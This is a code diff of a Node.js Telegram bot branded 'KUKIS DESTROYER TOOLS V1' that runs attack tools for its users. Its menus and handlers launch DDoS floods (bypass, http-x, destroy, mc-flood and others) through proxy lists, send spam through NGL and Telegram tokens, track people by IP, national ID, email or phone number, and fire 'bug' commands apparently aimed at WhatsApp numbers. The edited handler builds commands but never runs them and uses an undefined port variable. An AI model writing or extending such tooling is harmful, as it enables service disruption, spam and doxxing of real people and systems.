@@ -62,10 +62,10 @@ bot.on('callback_query', (query) => {
     const chatId = query.message.chat.id;
     const data = query.data;
     const menus = {
-        ddos: "KUKIS DESTROYER TOOLS V1\n╭─────❒ 「 DDOS COMMANDS 」\n│ /attack [target] [method] [time] [rate] [thread]\n│ /mc-attack [ip] [port] [time]\n└──────────❒",
-        spam: "KUKIS DESTROYER TOOLS V1\n╭─────❒ 「 SPAM COMMANDS 」\n│ /sngl [user] [msg] [jumlah]\n│ /tspam [token] [id] [msg] [jumlah]\n└──────────❒",
-        osint: "KUKIS DESTROYER TOOLS V1\n╭─────❒ 「 OSINT COMMANDS 」\n│ /track [target] ip\n└──────────❒",
-        bug: "KUKIS DESTROYER TOOLS V1\n╭─────❒ 「 BUG MENU 」\n│ /addsender 62XXXX\n│ /xdelay 62XXXX\n│ /xewe 62XXXX\n│ /bulldoz 62XXXX\n│ /tigerfc 62XXXX\n└──────────❒"
+        ddos: `╭─────❒ 「 DDOS COMMANDS 」\n│ /attack [target] [method] [time] [rate] [thread]\n│ /mc-attack [ip] [port] [time]\n├─────❒ 「 METHODS 」\n│ bypass, http-x, destroy, flood, mc-flood, strike\n└──────────❒`,
+        spam: `╭─────❒ 「 SPAM COMMANDS 」\n│ /sngl [username] [pesan] [jumlah] (Delay 100ms)\n│ /tspam [token] [id] [pesan] [jumlah] (Delay 100ms)\n└──────────❒`,
+        osint: `╭─────❒ 「 OSINT COMMANDS 」\n│ track [target] [methods]\n├─────❒ 「 METHODS 」\n│ ip, nik, email, number\n└──────────❒`,
+        bug: `╭─────❒ 「 BUG MENU 」\n│ /addsender 62XXXX\n│ /xdelay 62XXXX\n│ /xewe 62XXXX\n│ /bulldoz 62XXXX\n│ /tigerfc 62XXXX\n└──────────❒`
     };
     if (menus[data]) bot.sendMessage(chatId, menus[data]);
 });
@@ -74,7 +74,15 @@ bot.on('callback_query', (query) => {
 bot.onText(/\/attack (.+) (.+) (.+) (.+) (.+)/, (msg, match) => {
     const [_, target, method, time, rate, thread] = match;
     bot.sendMessage(msg.chat.id, `🚀 Attack Sent to ${target}!`);
-    exec(`node assets/Methods/${method}.js ${target} ${time} ${rate} ${thread} proxy.txt`);
+    let command = "";
+    switch(method) {
+        case 'bypass': command = `node assets/Methods/bypass.js ${target} ${time} ${rate} ${thread} proxy.txt`; break;
+        case 'http-x': command = `node assets/Methods/HTTP-X.js ${target} ${time} ${rate} ${thread} proxy.txt`; break;
+        case 'mc-flood': command = `node assets/Methods/mc-flood.js ${target} ${port} ${time}`; break;
+        case 'strike': command = `node assets/Methods/strike.js POST ${target} ${time} ${thread} ${rate}`; break;
+        case 'destroy': command = `node assets/Methods/destroy.js ${target} ${time} ${rate} ${thread} proxy.txt`; break;
+        case 'flood': command = `node assets/Methods/flood.js ${target} ${time}`; break;
+    }
 });
 
 // --- 2. SPAM (NGL & TELE) ---
